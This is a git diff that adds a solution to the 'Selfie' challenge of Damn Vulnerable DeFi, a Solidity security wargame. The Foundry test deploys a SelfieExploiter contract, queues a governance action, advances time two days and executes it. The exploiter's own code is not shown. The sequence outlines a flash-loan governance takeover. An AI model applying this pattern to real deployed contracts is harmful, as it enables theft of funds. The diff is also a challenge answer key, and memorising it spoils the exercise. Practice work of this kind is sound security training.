@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {SelfieExploiter} from "./SelfieExploiter.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,19 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        // deploy the exploiter contract
+        SelfieExploiter exploiter = new SelfieExploiter(
+            address(pool),
+            address(governance),
+            address(token),
+            address(recovery)
+        );
+        // call the exploitSetup function to queue the action (see comments in the functon for details)
+        require(exploiter.exploitSetup());
+        // 'wait' two days
+        vm.warp(block.timestamp + 2 days);
+        // call the exploitCloseup function to execute the action (see comments in the functon for details)
+        require(exploiter.exploitCloseup());
     }
 
     /**
